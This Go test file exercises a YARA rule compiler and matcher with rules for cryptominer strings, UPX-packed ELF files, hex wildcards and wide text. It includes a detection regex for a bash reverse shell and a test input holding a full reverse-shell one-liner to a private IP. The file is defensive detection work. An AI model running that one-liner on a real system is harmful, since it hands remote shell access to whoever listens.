package yara

import (
	"strings"
	"testing"
	"time"
)

const rules = `
/* test rules */
rule miner : linux crypto {
  meta:
    description = "XMRig and its forks"
    severity = "high"
    score = 80
  strings:
    $a = "stratum+tcp://" nocase
    $b = "donate-level"
    $c = "randomx" fullword
  condition:
    2 of them
}

rule elf_upx {
  strings:
    $upx = { 55 50 58 21 }   // UPX!
  condition:
    uint32(0) == 0x464c457f and $upx in (0..1024) and filesize < 5MB
}

rule hex_wild {
  strings:
    $h = { 7F 45 ?? 46 [1-3] ( 01 | 02 ) 0? }
  condition:
    $h at 0
}

rule wide_text {
  strings:
    $w = "evil" wide
    $r = /bash -i >& \/dev\/tcp\/[0-9.]+\/[0-9]+/
  condition:
    any of ($w, $r) and not #w > 3
}

rule unsupported_import {
  condition:
    pe.number_of_sections > 1
}

import "pe"
`

func names(rs []*Rule) string {
	var out []string
	for _, r := range rs {
		out = append(out, r.Name)
	}
	return strings.Join(out, ",")
}

func TestCompileAndMatch(t *testing.T) {
	rs, errs := Compile(rules)
	if names(rs) != "miner,elf_upx,hex_wild,wide_text" || len(errs) != 2 {
		t.Fatalf("compiled %s, errors %v", names(rs), errs)
	}
	if rs[0].Meta["description"] != "XMRig and its forks" || rs[0].Meta["score"] != "80" || strings.Join(rs[0].Tags, " ") != "linux crypto" {
		t.Fatalf("meta: %+v", rs[0])
	}
	elf := append([]byte{0x7f, 'E', 'L', 'F', 9, 9, 2, 0x05}, make([]byte, 100)...)
	elf = append(elf, []byte("UPX!")...)
	cases := []struct {
		data string
		want string
	}{
		{"pool STRATUM+TCP://x --donate-level 1", "miner"},
		{"stratum+tcp://x randomx", "miner"},
		{"stratum+tcp://x randomxx", ""},
		{string(elf), "elf_upx,hex_wild"},
		{"\x7fEXF\x00\x00\x00\x00", ""},
		{"e\x00v\x00i\x00l\x00", "wide_text"},
		{strings.Repeat("e\x00v\x00i\x00l\x00", 4), ""},
		{"x; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "wide_text"},
	}
	for _, c := range cases {
		if got := names(Match(rs, []byte(c.data))); got != c.want {
			t.Errorf("%q: got %q want %q", c.data, got, c.want)
		}
	}
}

func TestBadRules(t *testing.T) {
	for _, src := range []string{
		`rule a { condition: $x }`,
		`rule a { strings: $x = { 4G } condition: $x }`,
		`rule a { strings: $x = { [2] 41 } condition: $x }`,
		`rule a { strings: $x = "a" xor condition: $x }`,
		`rule a { strings: $x = "a" condition: $x and`,
		`rule a { strings: $x = /(/ condition: $x }`,
		`private rule a { condition: true }`,
	} {
		if rs, errs := Compile(src); len(rs) != 0 || len(errs) == 0 {
			t.Errorf("accepted: %s", src)
		}
	}
	// One bad rule does not take the good ones with it.
	rs, errs := Compile("rule bad { condition: $nope }\nrule good { condition: filesize > 0 }\n")
	if names(rs) != "good" || len(errs) != 1 {
		t.Fatalf("%s %v", names(rs), errs)
	}
}

func TestHexJumpsStayBounded(t *testing.T) {
	rs, errs := Compile(`rule j { strings: $a = { 41 [0-] 42 [0-] 43 [0-] 44 } condition: $a }`)
	if len(errs) != 0 {
		t.Fatal(errs)
	}
	data := []byte(strings.Repeat("A", 32<<20))
	start := time.Now()
	if len(Match(rs, data)) != 0 {
		t.Fatal("matched")
	}
	if d := time.Since(start); d > 5*time.Second {
		t.Fatalf("took %s", d)
	}
}
